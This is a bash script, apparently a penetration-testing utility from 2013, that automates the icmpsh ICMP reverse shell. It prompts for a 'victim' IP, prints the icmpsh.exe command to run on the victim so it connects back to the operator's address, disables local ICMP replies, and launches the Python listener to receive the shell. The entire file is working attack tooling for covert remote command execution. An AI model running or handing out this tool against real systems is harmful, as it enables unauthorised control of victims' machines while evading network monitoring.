#!/usr/bin/env bash
# icmp shell script
# Daniel Compton
# 05/2013

usage() {
    echo "Usage: $0 [-i interface]"
    echo ""
    echo "Options:"
    echo "  -i, --interface IFACE   Use a specific local interface (e.g. tun0, eth0)"
    echo "  -h, --help              Show this help message"
}

INTERFACE=""
while [ $# -gt 0 ]; do
    case "$1" in
        -i|--interface)
            if [ -z "$2" ]; then
                echo -e "\e[01;31m[!]\e[00m Missing value for $1"
                usage
                exit 1
            fi
            INTERFACE="$2"
            shift 2
            ;;
        -h|--help)
            usage
            exit 0
            ;;
        *)
            echo -e "\e[01;31m[!]\e[00m Unknown argument: $1"
            usage
            exit 1
            ;;
    esac
done

echo ""
echo ""
echo -e "\e[00;32m##################################################################\e[00m"
echo ""
echo "ICMP Shell Automation Script for"
echo ""
echo "https://github.com/inquisb/icmpsh"
echo ""
echo -e "\e[00;32m##################################################################\e[00m"

echo ""
IP=$(hostname -I 2>/dev/null | awk '{print $1}')

if [ -z "$IP" ]; then
    IP=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{for(i=1;i<=NF;i++) if ($i=="src") {print $(i+1); exit}}')
fi

if [ -z "$IP" ]; then
    echo -e "\e[01;31m[!]\e[00m Could not determine local IPv4 address automatically."
    exit 1
fi
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m What is the victims public IP address?"
echo -e "\e[1;31m-------------------------------------------------------------------\e[00m"
read VICTIM
echo ""
echo -e "\e[01;32m[-]\e[00m Run the following code on your victim system on the listender has started:"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
echo "icmpsh.exe -t $IP -d 500 -b 30 -s 128"
echo ""
echo -e "\e[01;32m++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
echo ""
LOCALICMP=$(cat /proc/sys/net/ipv4/icmp_echo_ignore_all)
if [ "$LOCALICMP" -eq 0 ]
                then 
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Local ICMP Replies are currently enabled, I will disable these temporarily now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null
                                ICMPDIS="disabled"
                else
                                echo ""
fi
echo ""
echo -e "\e[01;32m[-]\e[00m Launching Listener...,waiting for a inbound connection.."
echo ""
python3 icmpsh_m.py "$IP" "$VICTIM"
if [ "$ICMPDIS" = "disabled" ]
                then
                                echo ""
                                echo -e "\e[01;32m[-]\e[00m Enabling Local ICMP Replies again now"
                                sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null
                                echo ""
                else
                                echo ""
fi

exit 0
